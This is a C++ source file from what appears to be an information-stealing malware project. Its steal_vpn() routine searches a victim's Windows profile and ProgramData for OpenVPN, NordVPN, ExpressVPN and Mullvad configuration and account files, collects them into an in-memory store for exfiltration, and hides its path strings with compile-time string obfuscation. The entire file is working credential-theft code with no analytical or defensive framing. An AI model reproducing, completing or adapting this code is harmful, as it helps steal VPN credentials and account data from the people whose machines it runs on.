#include <misc_stealing/vpn.hpp>
#include <filesystem>
#include <string>
#include <windows.h>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;

namespace misc_exfiltration {

static void import_filtered(const std::string& vprefix, const fs::path& src,
    std::initializer_list<const char*> exts)
{
    if (!fs::exists(src)) return;
    try {
        for (const auto& entry : fs::directory_iterator(src)) {
            if (!entry.is_regular_file()) continue;
            std::string ext = entry.path().extension().string();
            for (const char* want : exts) {
                if (ext == want) {
                    mem_store::import_file(
                        vprefix + "/" + entry.path().filename().string(),
                        entry.path());
                    break;
                }
            }
        }
    } catch (const std::exception&) {}
}

void steal_vpn() {
    std::string home = features::get_home();
    std::string lapp = home + skCrypt("\\AppData\\Local\\");

    //openvpn
    {
        fs::path ovpn_cfg = fs::path(home) / skCrypt("OpenVPN") / skCrypt("config");
        if (fs::exists(ovpn_cfg)) {
            try {
                for (const auto& e : fs::recursive_directory_iterator(ovpn_cfg,
                    fs::directory_options::skip_permission_denied)) {
                    if (e.is_regular_file() && e.path().extension() == skCrypt(".ovpn"))
                        mem_store::import_file(
                            skCrypt("vpn/openvpn/") + e.path().filename().string(),
                            e.path());
                }
            } catch (const std::exception&) {}
        }
    }

    //nordvpn
    {
        fs::path nord = fs::path(lapp) / skCrypt("NordVPN\\NordVPN.exe");
        if (!fs::exists(nord)) nord = fs::path(lapp) / skCrypt("NordVPN");
        if (fs::exists(nord))
            import_filtered(skCrypt("vpn/nordvpn"), nord, { skCrypt(".config"), skCrypt(".json"), skCrypt(".xml") });
    }

    //expressvpn
    import_filtered(skCrypt("vpn/expressvpn"), fs::path(lapp) / skCrypt("ExpressVPN"),
        { skCrypt(".json"), skCrypt(".xml"), skCrypt(".conf"), skCrypt(".config") });

    //mullvad - account-number file + settings.json, check both install variants
    import_filtered(skCrypt("vpn/mullvad"), fs::path(skCrypt("C:\\ProgramData\\Mullvad VPN")),
        { skCrypt(".json"), skCrypt(".toml"), skCrypt(".conf") });
    import_filtered(skCrypt("vpn/mullvad"), fs::path(lapp) / skCrypt("Mullvad VPN"),
        { skCrypt(".json"), skCrypt(".toml"), skCrypt(".conf") });
}
}
